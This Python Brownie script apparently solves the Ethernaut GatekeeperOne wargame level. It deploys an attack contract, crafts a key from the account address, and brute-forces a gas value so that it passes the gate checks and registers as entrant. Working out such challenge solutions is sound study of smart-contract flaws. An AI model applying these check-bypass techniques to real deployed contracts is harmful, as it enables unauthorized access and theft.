from scripts.helper.context import *
from scripts.helper.account import _from, acc
from brownie import GatekeeperOne, GatekeeperOneAttack

##########################################
# Make it past the gatekeeper and register as an entrant to pass this level.
#########################################

# test locally
def deploy_locally(ContractObject, from_account, constructor_params={}):
    return ContractObject.deploy(from_account, **constructor_params)

# solve the challenge
def solve_challenge(locally=False, bruteforce=False):
    if not locally:
        # load challenge
        gatekeeper = load_challenge(ContractObject=GatekeeperOne, instance_key='gatekeeper1')
    else:
        gatekeeper = deploy_locally(ContractObject=GatekeeperOne, from_account=_from)

    # deploy attacker contract
    gkoattack = GatekeeperOneAttack.deploy(gatekeeper.address, _from)

    # call `enter()` with the required parameters
    # pass different values for _gasBruteForce to send a specific
    # amount of remaining gas to the contract to pass the second require statement
    modified_tx_origin = f"0x{'0'*31}A0000{acc.address[-4:]}"
    if bruteforce:
        for i in range(100,300,1):
            try:
                tx = gkoattack.callEnter(modified_tx_origin, i, _from)
                print(f"Correct gas: {i}")
                break
            except:
                continue
    else:
        tx = gkoattack.callEnter(modified_tx_origin, 211, _from)

    # check that the address is entrant
    entrant_assertion = gatekeeper.entrant() == acc.address
    print(f"Address is entrant: {entrant_assertion}")
    
    return entrant_assertion


def main():
    solve_challenge(locally=True, bruteforce=False)
